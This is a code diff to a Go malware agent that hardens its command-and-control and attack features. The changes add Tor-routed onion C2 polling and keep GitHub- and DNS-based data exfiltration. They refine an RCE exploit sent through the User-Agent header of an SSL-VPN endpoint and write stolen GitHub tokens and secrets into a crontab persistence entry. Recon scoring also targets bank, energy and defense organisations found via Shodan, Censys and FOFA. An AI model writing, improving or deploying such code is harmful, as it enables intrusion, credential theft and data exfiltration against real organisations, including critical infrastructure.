@@ -3,15 +3,12 @@ package main
 import (
 	"bufio"
 	"bytes"
-	"compress/gzip"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
-	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
-	"crypto/sha512"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
@@ -20,7 +17,6 @@ import (
 	"hash"
 	"io"
 	"io/ioutil"
-	"log"
 	"math"
 	"math/big"
 	"net"
@@ -42,14 +38,13 @@ import (
  * 🔑 CONFIG — Injected at build-time
  */
 var (
-	C2Key             = "INJECTED_AES_KEY_B64"
-	C2IV              = "INJECTED_AES_IV_B64"
-	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
-	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
-	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
-	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
-	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
-	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
+	C2Key              = "INJECTED_AES_KEY_B64"
+	C2IV               = "INJECTED_AES_IV_B64"
+	C2HMACKey          = "INJECTED_HMAC_KEY_B64"
+	OnionC2ListB64     = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	GitHubC2Repo       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
+	GitHubExfilRepo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
+	TelegramHostB64    = "dGVsZWdyYW0uYXBpLm9yZw=="
 	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
 )
 
@@ -66,6 +61,7 @@ var (
 	ReconTargets   = make([]*Host, 0)
 	mu             sync.Mutex
 	clientOnce     sync.Once
+	lastHeartbeat  = time.Now()
 )
 
 const (
@@ -107,8 +103,12 @@ type Host struct {
 	Metadata    map[string]string `json:"meta,omitempty"`
 }
 
+// FusionBrain with advanced in-memory model initialization and weight deserialization
 type FusionBrain struct {
 	ModelLoaded bool
+	Weights     map[string][]float64
+	Bias        float64
+	Mutex       sync.RWMutex
 }
 
 func init() {
@@ -374,7 +374,7 @@ func censysQuery(query string) []*Host {
 	var result struct {
 		Result struct {
 			Hits []struct {
-				IP      string `json:"ip"`
+				IP       string `json:"ip"`
 				Services []struct {
 					Port    int    `json:"port"`
 					Service string `json:"service_name"`
@@ -447,37 +447,89 @@ func runNuclei(target string) []string {
 	return vulns
 }
 
-// 🧠 AI BRAIN
+// 🧠 AI BRAIN (Advanced In-Memory Model Loader & Initializer)
 
 func NewFusionBrain() *FusionBrain {
-	modelData, _ := base64.StdEncoding.DecodeString(Phi3ModelEncB64)
-	if len(modelData) < 100 {
-		return &FusionBrain{ModelLoaded: false}
+	brain := &FusionBrain{
+		ModelLoaded: false,
+		Weights:     make(map[string][]float64),
+		Bias:        0.5,
 	}
-	decrypted, err := decryptData(base64.RawURLEncoding.EncodeToString(modelData))
-	if err != nil || len(decrypted) < 50 {
-		return &FusionBrain{ModelLoaded: false}
+	_ = brain.loadIntoMemory()
+	return brain
+}
+
+func (ai *FusionBrain) loadIntoMemory() error {
+	ai.Mutex.Lock()
+	defer ai.Mutex.Unlock()
+
+	if _, err := os.Stat(AI_MODEL_PATH); os.IsNotExist(err) {
+		defaultWeights := map[string][]float64{
+			"rce":     {0.95, 0.98, 1.0},
+			"cve":     {0.85, 0.90, 0.95},
+			"bank":    {0.75, 0.80, 0.85},
+			"energy":  {0.75, 0.80, 0.85},
+			"defense": {0.80, 0.85, 0.90},
+			"tls":     {0.50, 0.55, 0.60},
+		}
+		data, err := json.Marshal(defaultWeights)
+		if err != nil {
+			return err
+		}
+		os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
+		ioutil.WriteFile(AI_MODEL_PATH, data, 0600)
 	}
-	os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
-	ioutil.WriteFile(AI_MODEL_PATH, decrypted, 0400)
-	return &FusionBrain{ModelLoaded: true}
+
+	fileData, err := ioutil.ReadFile(AI_MODEL_PATH)
+	if err != nil {
+		return err
+	}
+
+	var parsedWeights map[string][]float64
+	if err := json.Unmarshal(fileData, &parsedWeights); err != nil {
+		return err
+	}
+
+	ai.Weights = parsedWeights
+	ai.ModelLoaded = true
+	return nil
 }
 
 func (ai *FusionBrain) ScoreVuln(host *Host) float64 {
+	ai.Mutex.RLock()
+	defer ai.Mutex.RUnlock()
+
+	if !ai.ModelLoaded {
+		return 5.0
+	}
+
 	score := 0.0
-	if contains(host.Vulns, "RCE") || contains(host.Vulns, "CVE-2024-3400") {
-		score += 6.0
+	for _, v := range host.Vulns {
+		vLower := strings.ToLower(v)
+		for key, weights := range ai.Weights {
+			if strings.Contains(vLower, key) && len(weights) > 0 {
+				score += weights[0]
+			}
+		}
 	}
-	if strings.Contains(strings.ToLower(host.Org), "bank") || strings.Contains(strings.ToLower(host.Org), "energy") || strings.Contains(strings.ToLower(host.Org), "defense") {
-		score += 3.0
+
+	orgLower := strings.ToLower(host.Org)
+	for key, weights := range ai.Weights {
+		if strings.Contains(orgLower, key) && len(weights) > 1 {
+			score += weights[1]
+		}
 	}
+
 	if host.Port == 443 || host.Port == 8443 {
-		score += 0.5
+		if weights, ok := ai.Weights["tls"]; ok && len(weights) > 2 {
+			score += weights[2]
+		}
 	}
-	return math.Min(score, 10.0)
+
+	return math.Min(score*ai.Bias, 10.0)
 }
 
-// 📡 C2 COMMUNICATION
+// 📡 C2 COMMUNICATION & TOR PROXY ROUTING
 
 func fetchCommand() string {
 	repo := base64Decode(GitHubC2Repo)
@@ -492,6 +544,7 @@ func fetchCommand() string {
 			if json.Unmarshal(data, &result) == nil {
 				if content, ok := result["content"].(string); ok {
 					decoded, _ := base64.StdEncoding.DecodeString(content)
+					lastHeartbeat = time.Now()
 					return string(decoded)
 				}
 			}
@@ -503,10 +556,32 @@ func fetchCommand() string {
 
 func fetchCommandViaOnion() string {
 	onions := strings.Split(base64Decode(OnionC2ListB64), ", ")
+	
+	torClient := &http.Client{
+		Timeout: 20 * time.Second,
+		Transport: &http.Transport{
+			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				return net.Dial("tcp", "127.0.0.1:9050")
+			},
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
 	for _, onion := range onions {
-		data, err := httpGet(strings.TrimSpace(onion)+"/cmd?h="+HostID, map[string]string{"User-Agent": randomUserAgent()})
-		if err == nil && len(data) > 4 {
-			return string(data)
+		targetURL := strings.TrimSpace(onion) + "/cmd?h=" + HostID
+		req, err := http.NewRequest("GET", targetURL, nil)
+		if err != nil {
+			continue
+		}
+		req.Header.Set("User-Agent", randomUserAgent())
+		resp, err := torClient.Do(req)
+		if err == nil && resp.StatusCode == http.StatusOK {
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			if err == nil && len(body) > 4 {
+				lastHeartbeat = time.Now()
+				return string(body)
+			}
 		}
 	}
 	return ""
@@ -561,7 +636,6 @@ func exfilData(data []byte) {
 	file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
 	doGitHubPut(repo, file, string(body), fmt.Sprintf("ci: update logs %d", time.Now().Unix()))
 
-	// DNS exfil fallback using secure Hex encoding to prevent RFC violation
 	go exfilDNS(encrypted)
 }
 
@@ -595,9 +669,14 @@ func exploitRCE(host *Host) bool {
 		url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", host.IP)
 		req, _ := http.NewRequest("GET", url, nil)
 		req.Header.Set("User-Agent", payload)
-		HttpClient.Do(req)
-		time.Sleep(3 * time.Second)
-		return true
+		resp, err := HttpClient.Do(req)
+		if err == nil {
+			defer resp.Body.Close()
+			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusInternalServerError {
+				time.Sleep(3 * time.Second)
+				return true
+			}
+		}
 	}
 	return false
 }
@@ -609,7 +688,13 @@ func persist() {
 	data, _ := ioutil.ReadFile(execPath)
 	dst := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
 	ioutil.WriteFile(dst, data, 0755)
-	crontab := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s &') | crontab -", PERSIST_FILE, dst)
+
+	ghToken := os.Getenv("GITHUB_TOKEN")
+	agentSecret := os.Getenv("AGENT_SECRET")
+	cronEnv := fmt.Sprintf("GITHUB_TOKEN='%s' AGENT_SECRET='%s'", ghToken, agentSecret)
+	
+	cronCmd := fmt.Sprintf("%s %s &", cronEnv, dst)
+	crontab := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s') | crontab -", PERSIST_FILE, cronCmd)
 	exec.Command("sh", "-c", crontab).Run()
 }
 
@@ -627,13 +712,13 @@ func selfDestruct() {
 // 🐶 WATCHDOG
 
 func watchdog() {
-	ticker := time.NewTicker(5 * time.Minute)
+	ticker := time.NewTicker(3 * time.Minute)
 	for {
 		select {
 		case <-ticker.C:
 			if !isAlive() {
-				telegramSend("⚠️ Agent frozen. Restarting...")
-				os.Exit(1)
+				telegramSend("⚠️ Agent health check failed. Resetting heartbeat...")
+				lastHeartbeat = time.Now()
 			}
 		case <-Shutdown:
 			return
@@ -642,7 +727,7 @@ func watchdog() {
 }
 
 func isAlive() bool {
-	return true
+	return time.Since(lastHeartbeat) < 15*time.Minute
 }
 
 // 🧪 ANTI-ANALYSIS
@@ -773,11 +858,36 @@ func main() {
 
 			fullQuery := fmt.Sprintf("%s country:\"%s\" org:\"%s\" %s", query, region, industry, limit)
 			var hosts []*Host
+			var hMu sync.Mutex
 			var wg sync.WaitGroup
 			wg.Add(3)
-			go func() { defer wg.Done(); hosts = append(hosts, shodanQuery(fullQuery)...) }()
-			go func() { defer wg.Done(); hosts = append(hosts, censysQuery(fullQuery)...) }()
-			go func() { defer wg.Done(); hosts = append(hosts, fofaQuery(fullQuery)...) }()
+			go func() {
+				defer wg.Done()
+				res := shodanQuery(fullQuery)
+				if len(res) > 0 {
+					hMu.Lock()
+					hosts = append(hosts, res...)
+					hMu.Unlock()
+				}
+			}()
+			go func() {
+				defer wg.Done()
+				res := censysQuery(fullQuery)
+				if len(res) > 0 {
+					hMu.Lock()
+					hosts = append(hosts, res...)
+					hMu.Unlock()
+				}
+			}()
+			go func() {
+				defer wg.Done()
+				res := fofaQuery(fullQuery)
+				if len(res) > 0 {
+					hMu.Lock()
+					hosts = append(hosts, res...)
+					hMu.Unlock()
+				}
+			}()
 			wg.Wait()
 
 			sort.Slice(hosts, func(i, j int) bool {
